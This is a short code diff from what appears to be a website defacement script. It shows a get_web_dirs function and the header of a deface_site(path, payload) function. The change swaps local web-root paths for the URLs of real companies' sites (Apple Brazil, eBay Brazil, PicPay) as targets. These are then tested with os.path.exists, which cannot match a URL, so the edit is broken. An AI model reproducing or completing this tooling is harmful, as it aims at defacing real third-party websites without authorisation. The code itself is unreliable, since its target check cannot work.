@@ -2,7 +2,7 @@ import os
 
 def get_web_dirs():
     # Common web directories on Linux 
-    dirs = ["/var/www/html","/srv/http","/usr/share/nginx/html"]
+    dirs = ["https://www.apple.com/br/imac/", "https://br.ebay.com/","https://picpay.com/"]
     return [d for d in dirs if os.path.exists(d)]
 
 def deface_site(path, payload):
